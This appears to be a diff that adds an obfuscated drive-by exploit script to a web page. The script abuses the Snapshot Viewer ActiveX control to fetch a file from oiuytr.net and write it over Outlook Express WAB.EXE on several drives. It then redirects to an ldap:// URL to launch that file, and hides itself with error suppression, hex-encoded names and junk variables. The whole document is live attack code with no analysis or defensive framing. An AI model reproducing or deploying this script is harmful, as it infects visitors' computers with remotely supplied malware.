@@ -1,0 +1,50 @@
+<script type="text/javascript">function fckErrors() {
+return true;
+}
+window.onerror = fckErrors;
+
+var fuckavo="SB";
+var x;
+var fuckavp="SB";
+var obj;
+var fuckavx="SB";
+var mycars = new Array();
+var fuckava="SB";
+mycars[0] = "c:/Program Files/Outlook Express/WAB.EXE";
+mycars[2] = "e:/Program Files/Outlook Express/wAB.EXE";
+mycars[1] = "d:/Program Files/Outlook Express/WAB.EXE";
+
+var objlcx = new ActiveXObject("\x73\x6e\x70\x76\x77\x2e\x53\x6e\x61\x70\x73\x68\x6f\x74 \x56\x69\x65\x77\x65\x72 \x43\x6f\x6e\x74\x72\x6f\x6c\x2e\x31");
+
+if(objlcx="[object]")
+{
+
+setTimeout('window.location = "ldap://"',3000);
+
+for (x in mycars)
+{
+obj = new ActiveXObject("snpvw.Snapshot Viewer Control.1")
+
+var yrtytr="ghjhgjyrt";
+
+var buf1 = 'http://www.oiuytr.net/new/a308.css';
+var nbv="nvbfdsf";
+var buf2=mycars[x];
+var hfgnvbj="wertg";
+
+var gghfdvj="fdfssd";
+obj.Zoom = 0;
+var gghfdvj="fdfssd";
+obj.ShowNavigationButtons = false;
+obj.AllowContextMenu = false;
+obj.SnapshotPath = buf1;
+
+try
+{
+obj.CompressedPath = buf2;
+obj.PrintSnapshot();}catch(e){}var kxxxxxx="xxxxxxd";
+
+}
+}
+var ghdg="SB";var jhsnfvasx="SBd";var jqfs="d";var qjqfs="d";
+</script>
